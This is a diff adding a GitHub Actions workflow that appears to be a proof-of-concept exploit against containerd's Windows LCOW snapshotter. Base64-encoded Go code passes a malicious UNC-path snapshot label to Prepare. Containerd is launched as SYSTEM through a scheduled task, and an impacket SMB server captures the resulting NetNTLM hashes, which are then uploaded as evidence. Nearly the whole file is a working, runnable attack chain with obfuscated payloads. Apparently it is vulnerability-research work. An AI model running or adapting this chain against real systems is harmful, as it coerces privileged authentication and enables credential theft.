@@ -1,0 +1,85 @@
+name: D17 LCOW UNC NetNTLM via Windows container SMB
+on:
+  workflow_dispatch:
+
+jobs:
+  winsmb:
+    runs-on: windows-latest
+    timeout-minutes: 35
+    steps:
+      - name: Setup containerd + harness + stub
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Stop'
+          $base='C:\ctdpoc'
+          New-Item -ItemType Directory -Force -Path "$base\bin","$base\root","$base\state","$base\canary","$base\go","$base\stub","$base\share" | Out-Null
+          Invoke-WebRequest -Uri 'https://github.com/containerd/containerd/releases/download/v2.4.2/containerd-2.4.2-windows-amd64.tar.gz' -OutFile "$base\ctd.tar.gz" -UseBasicParsing
+          tar xzf "$base\ctd.tar.gz" -C "$base\bin"
+          $cfg='dmVyc2lvbiA9IDIKcm9vdCA9ICJDOi9jdGRwb2Mvcm9vdCIKc3RhdGUgPSAiQzovY3RkcG9jL3N0YXRlIgpbcGx1Z2lucy4naW8uY29udGFpbmVyZC5zZXJ2ZXIudjEuZ3JwYyddCiAgYWRkcmVzcyA9ICdcXC5ccGlwZVxjdGQtZ3JwYycKW3BsdWdpbnMuJ2lvLmNvbnRhaW5lcmQuc2VydmVyLnYxLnR0cnBjJ10KICBhZGRyZXNzID0gJ1xcLlxwaXBlXGN0ZC10dHJwYycKW2RlYnVnXQogIGxldmVsID0gJ2RlYnVnJwo='; [IO.File]::WriteAllBytes("$base\config.toml",[Convert]::FromBase64String($cfg))
+          $gm='bW9kdWxlIGQxN3BvYwoKZ28gMS4yNAoKcmVxdWlyZSBnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92MiB2Mi40LjIK'; [IO.File]::WriteAllBytes("$base\go\go.mod",[Convert]::FromBase64String($gm))
+          $mn='cGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImNvbnRleHQiCiAgICAiZm10IgogICAgIm9zIgoKICAgICJnaXRodWIuY29tL2NvbnRhaW5lcmQvY29udGFpbmVyZC92Mi9jbGllbnQiCiAgICAiZ2l0aHViLmNvbS9jb250YWluZXJkL2NvbnRhaW5lcmQvdjIvY29yZS9zbmFwc2hvdHMiCikKCmZ1bmMgbWFpbigpIHsKICAgIC8vIGFyZ3M6IDxhZGRyZXNzPiA8bmFtZXNwYWNlPiA8c25hcHNob3R0ZXI+IDxrZXk+IDxsYWJlbC1rZXk+IDxsYWJlbC12YWx1ZT4KICAgIGlmIGxlbihvcy5BcmdzKSA8IDcgewogICAgICAgIGZtdC5QcmludGxuKCJuZWVkIDYgYXJncyIpCiAgICAgICAgb3MuRXhpdCgyKQogICAgfQogICAgYWRkciwgbnMsIHNuYXAsIGtleSwgbGssIGx2IDo9IG9zLkFyZ3NbMV0sIG9zLkFyZ3NbMl0sIG9zLkFyZ3NbM10sIG9zLkFyZ3NbNF0sIG9zLkFyZ3NbNV0sIG9zLkFyZ3NbNl0KICAgIGN0eCA6PSBjb250ZXh0LkJhY2tncm91bmQoKQogICAgYywgZXJyIDo9IGNsaWVudC5OZXcoYWRkciwgY2xpZW50LldpdGhEZWZhdWx0TmFtZXNwYWNlKG5zKSkKICAgIGlmIGVyciAhPSBuaWwgewogICAgICAgIGZtdC5QcmludGxuKCJjbGllbnQgZXJyOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBkZWZlciBjLkNsb3NlKCkKCiAgICAvLyBUaGlzIG1pcnJvcnMgQ1JJIFJ1blBvZFNhbmRib3g6IHVudHJ1c3RlZCBwb2QgYW5ub3RhdGlvbnMgYXJlIHBhc3NlZAogICAgLy8gdmVyYmF0aW0gYXMgc25hcHNob3QgbGFiZWxzIHRvIFNuYXBzaG90dGVyLlByZXBhcmUgdmlhIFdpdGhMYWJlbHMuCiAgICBtYWxpY2lvdXMgOj0gbWFwW3N0cmluZ11zdHJpbmd7bGs6IGx2fQogICAgc3MgOj0gYy5TbmFwc2hvdFNlcnZpY2Uoc25hcCkKICAgIG1vdW50cywgZXJyIDo9IHNzLlByZXBhcmUoY3R4LCBrZXksICIiLCBzbmFwc2hvdHMuV2l0aExhYmVscyhtYWxpY2lvdXMpKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LlByaW50bG4oIlBSRVBBUkVfRVJSOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmbXQuUHJpbnRsbigiUFJFUEFSRV9PSyBtb3VudHM6IiwgbW91bnRzKQp9Cg=='; [IO.File]::WriteAllBytes("$base\go\main.go",[Convert]::FromBase64String($mn))
+          $st='Ly9nbzpidWlsZCB3aW5kb3dzCgovLyBydW5oY3Nfc3R1Yi5nbyAtIExBQiBIQVJORVNTIGZvciB0aGUgSHlwZXItVi1kZXBlbmRlbnQgcnVuaGNzLmV4ZSBoZWxwZXIuCi8vIEltcGxlbWVudHMgdGhlIG5hcnJvdyBpbnRlcmZhY2UgY29udGFpbmVyZCdzIExDT1cgc25hcHNob3R0ZXIgdXNlczoKLy8gICBydW5oY3MuZXhlIDxnbG9iYWwgZmxhZ3M+IGNyZWF0ZS1zY3JhdGNoIC0tZGVzdHBhdGggPHBhdGg+Ci8vIEl0IGNyZWF0ZXMgYSBmaWxlIGF0IDxwYXRoPiAoYSBzdGFuZC1pbiBmb3IgdGhlIGV4dDQgVkhEWCB0aGF0IGdlbnVpbmUKLy8gcnVuaGNzIHByb2R1Y2VzIHZpYSBhIFVWTSkuIFRoaXMgaXMgTk9UIHRoZSB2dWxuZXJhYmlsaXR5IC0gdGhlIHZ1bG5lcmFibGUKLy8gY29kZSBpcyBjb250YWluZXJkJ3MgdXNlIG9mIGFuIGF0dGFja2VyLWNvbnRyb2xsZWQgbGFiZWwgYXMgYSBmaWxlc3lzdGVtCi8vIHBhdGgsIHdoaWNoIHJ1bnMgZm9yIHJlYWwgaW4gdGhpcyBQb0MuCnBhY2thZ2UgbWFpbgoKaW1wb3J0ICgKICAgICJmbXQiCiAgICAib3MiCikKCmZ1bmMgbWFpbigpIHsKICAgIGRlc3QgOj0gIiIKICAgIGZvciBpLCBhIDo9IHJhbmdlIG9zLkFyZ3MgewogICAgICAgIGlmIGEgPT0gIi0tZGVzdHBhdGgiICYmIGkrMSA8IGxlbihvcy5BcmdzKSB7CiAgICAgICAgICAgIGRlc3QgPSBvcy5BcmdzW2krMV0KICAgICAgICB9CiAgICB9CiAgICBpZiBkZXN0ID09ICIiIHsKICAgICAgICBmbXQuRnByaW50bG4ob3MuU3RkZXJyLCAicnVuaGNzIHN0dWI6IC0tZGVzdHBhdGggcmVxdWlyZWQiKQogICAgICAgIG9zLkV4aXQoMSkKICAgIH0KICAgIGYsIGVyciA6PSBvcy5PcGVuRmlsZShkZXN0LCBvcy5PX0NSRUFURXxvcy5PX1dST05MWXxvcy5PX1RSVU5DLCAwNjAwKQogICAgaWYgZXJyICE9IG5pbCB7CiAgICAgICAgZm10LkZwcmludGxuKG9zLlN0ZGVyciwgInJ1bmhjcyBzdHViOiBvcGVuOiIsIGVycikKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICAvLyBtaW5pbWFsIFZIRFgtbGlrZSBwbGFjZWhvbGRlciBjb250ZW50ICg1MTIgYnl0ZXMpCiAgICBidWYgOj0gbWFrZShbXWJ5dGUsIDUxMikKICAgIGNvcHkoYnVmLCBbXWJ5dGUoImNvbnRhaW5lZCB2aXJ0YWwgZGlzayBwbGFjZWhvbGRlciAobGFiIGhhcm5lc3MpIikpCiAgICBpZiBfLCBlcnIgOj0gZi5Xcml0ZShidWYpOyBlcnIgIT0gbmlsIHsKICAgICAgICBmLkNsb3NlKCkKICAgICAgICBvcy5FeGl0KDEpCiAgICB9CiAgICBmLkNsb3NlKCkKICAgIGZtdC5QcmludGxuKCJydW5oY3Mgc3R1YjogY3JlYXRlZCIsIGRlc3QpCn0K'; [IO.File]::WriteAllBytes("$base\stub\main.go",[Convert]::FromBase64String($st))
+          Set-Content "$base\stub\go.mod" -Value "module stub`n`ngo 1.24" -Encoding ascii
+          $env:GO111MODULE='on'
+          Set-Location "$base\go"; go mod tidy 2>&1 | Out-Null; go build -o "$base\poc.exe" . 2>&1 | Out-Null
+          Set-Location "$base\stub"; go build -o "$base\bin\bin\runhcs.exe" . 2>&1 | Out-Null
+          Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/fortra/impacket/master/examples/smbserver.py' -OutFile "$base\smbserver.py" -UseBasicParsing
+          Write-Output "SETUP_OK"
+
+      - name: Pull Python Windows container + start SMB server
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          Write-Output '=== pulling image (may take minutes) ==='
+          docker pull python:3.12-windowsservercore-ltsc2022 2>&1 | Select-Object -Last 8
+          Write-Output "PULL_EXIT=$LASTEXITCODE"
+          docker images python:3.12-windowsservercore-ltsc2022 2>&1
+          $cmd = 'python -m pip install --quiet impacket && python C:\ctdpoc\smbserver.py -smb2support -disablekerberos -debug -ip 0.0.0.0 -outputfile C:\ctdpoc\smb.log SHARE C:\ctdpoc\share'
+          $d = docker run -d --name smb -v 'C:\ctdpoc:C:\ctdpoc' python:3.12-windowsservercore-ltsc2022 cmd /c $cmd 2>&1
+          Write-Output "DOCKER_RUN=$d"
+          Start-Sleep -Seconds 40
+          Write-Output '=== container ps ==='
+          docker ps -a 2>&1
+          Write-Output '=== container logs ==='
+          docker logs smb 2>&1 | Select-Object -Last 25
+          $cip = docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smb 2>&1
+          Write-Output "CONTAINER_IP=$cip"
+
+      - name: Start containerd(SYSTEM) + trigger UNC + capture
+        shell: pwsh
+        run: |
+          $ErrorActionPreference='Continue'
+          $base='C:\ctdpoc'
+          $cip = docker inspect --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' smb 2>&1
+          Write-Output "CONTAINER_IP=$cip"
+          $unc = "\\$cip\SHARE"
+          Write-Output "UNC=$unc"
+          # start containerd as SYSTEM
+          $act=New-ScheduledTaskAction -Execute 'cmd.exe' -Argument "/c `"$base\bin\bin\containerd.exe --config $base\config.toml --log-level debug > $base\stdout.log 2> $base\stderr.log`""
+          $prin=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+          $task=New-ScheduledTask -Action $act -Principal $prin
+          Register-ScheduledTask -TaskName 'ctdpoc-daemon' -InputObject $task -Force | Out-Null
+          Start-ScheduledTask -TaskName 'ctdpoc-daemon'
+          Start-Sleep -Seconds 10
+          Get-Process containerd -ErrorAction SilentlyContinue | Select-Object Id,ProcessName | Format-Table
+          & "$base\bin\bin\ctr.exe" --address '\\.\pipe\ctd-grpc' plugins ls 2>&1 | Select-String 'windows-lcow'
+          Write-Output "=== malicious UNC label: $unc ==="
+          & "$base\poc.exe" '\\.\pipe\ctd-grpc' 'd17poc' 'windows-lcow' 'victim-winsmb' 'containerd.io/snapshot/io.microsoft.container.storage.rootfs.location' $unc 2>&1 | Tee-Object -FilePath "$base\prepare_winsmb.out"
+          Write-Output "POC_EXIT=$LASTEXITCODE"
+          Start-Sleep -Seconds 5
+          Write-Output '=== captured SMB hash log ==='
+          if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 } else { Write-Output 'NO SMB LOG' }
+          Write-Output '=== container logs tail ==='
+          docker logs smb 2>&1 | Select-Object -Last 40
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctd-winsmb-evidence
+          path: |
+            C:\ctdpoc\smb.log
+            C:\ctdpoc\prepare_winsmb.out
+            C:\ctdpoc\stderr.log
+            C:\ctdpoc\stdout.log
+          if-no-files-found: warn
